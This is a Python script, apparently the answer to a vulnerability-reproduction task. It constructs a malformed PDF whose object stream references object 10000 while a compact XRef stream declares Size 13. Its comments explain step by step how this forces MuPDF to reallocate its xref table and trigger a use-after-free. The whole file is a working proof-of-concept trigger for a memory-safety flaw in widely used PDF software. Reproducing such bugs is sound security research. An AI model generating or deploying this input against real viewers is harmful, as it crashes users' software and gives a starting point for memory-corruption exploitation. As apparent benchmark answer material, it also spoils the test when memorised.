class Solution:
    def solve(self, src_path: str) -> bytes:
        # PDF Header
        header = b"%PDF-1.5\n%\x80\x81\x82\x83\n"
        
        # Object 10: Object Stream
        # Content: "10000 0 (A)"
        # This defines object 10000 at offset 0 relative to First.
        # "10000 0 " is 8 bytes. So First is 8.
        # The reference to object 10000 is key: it forces the xref table to resize
        # because 10000 is significantly larger than the initial Size (13).
        stm_data = b"10000 0 (A)"
        
        obj10_start = (
            b"10 0 obj\n"
            b"<< /Type /ObjStm /N 1 /First 8 /Length %d >>\n"
            b"stream\n"
        ) % len(stm_data)
        
        # The newline before endstream acts as the EOL marker
        obj10 = obj10_start + stm_data + b"\nendstream\nendobj\n"
        
        offset_10 = len(header)
        offset_12 = offset_10 + len(obj10)
        
        # Object 12: XRef Stream
        # Maps:
        # 0: Free
        # 10: Type 1 (Offset of Obj 10)
        # 11: Type 2 (In Stream 10, Index 0) -> Triggers load of Obj 10 via Root
        # 12: Type 1 (Offset of Obj 12)
        
        # W [1 4 1] -> 6 bytes per entry
        
        # Entry 0
        row0 = b"\x00\x00\x00\x00\x00\x00"
        
        # Entry 10: Type 1, offset_10
        row10 = b"\x01" + offset_10.to_bytes(4, 'big') + b"\x00"
        
        # Entry 11: Type 2, Stream 10, Index 0
        # When Root (11) is accessed, MuPDF loads Stream 10.
        # While parsing Stream 10's index ("10000 0"), it hits 10000.
        # 10000 > Size (13) -> Resize/Realloc of xref table.
        # The pointer to Obj 10's xref entry (held by the loader) becomes invalid.
        # Subsequent access triggers UAF.
        row11 = b"\x02" + (10).to_bytes(4, 'big') + b"\x00"
        
        # Entry 12: Type 1, offset_12
        row12 = b"\x01" + offset_12.to_bytes(4, 'big') + b"\x00"
        
        xref_data = row0 + row10 + row11 + row12
        
        # Size 13 is small enough that 10000 triggers resize
        obj12_start = (
            b"12 0 obj\n"
            b"<< /Type /XRef /Size 13 /W [1 4 1] /Index [0 1 10 3] /Root 11 0 R /Length %d >>\n"
            b"stream\n"
        ) % len(xref_data)
        
        obj12 = obj12_start + xref_data + b"\nendstream\nendobj\n"
        
        trailer = (
            b"startxref\n"
            b"%d\n"
            b"%%%%EOF\n"
        ) % offset_12
        
        return header + obj10 + obj12 + trailer
